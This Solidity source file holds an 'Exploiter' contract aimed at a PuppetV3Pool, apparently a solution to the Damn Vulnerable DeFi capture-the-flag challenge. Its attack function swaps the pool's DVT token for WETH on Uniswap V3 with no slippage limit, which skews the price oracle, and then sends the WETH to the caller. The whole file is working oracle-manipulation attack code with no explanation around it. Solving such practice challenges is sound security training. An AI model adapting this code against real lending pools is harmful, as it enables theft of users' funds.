// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

import "./PuppetV3Pool.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploiter {
    uint24 private constant FEE = 3000;
    PuppetV3Pool private immutable puppetPool;

    constructor(address payable _puppetPoolAddress) {
        puppetPool = PuppetV3Pool(_puppetPoolAddress);
    }

    function attack(uint256 amount) external payable {
        address weth = address(puppetPool.weth());
        address token = address(puppetPool.token());
        ISwapRouter uniswapV3Router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

        // call exactInputSingle for swapping DVT for WETH
        IERC20(token).approve(address(uniswapV3Router), amount);
        uint256 amountOutWeth = uniswapV3Router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: token,
                tokenOut: weth,
                fee: FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // transfer weth token to attacker
        IERC20(weth).transfer(msg.sender, IERC20(weth).balanceOf(address(this)));
    }
}
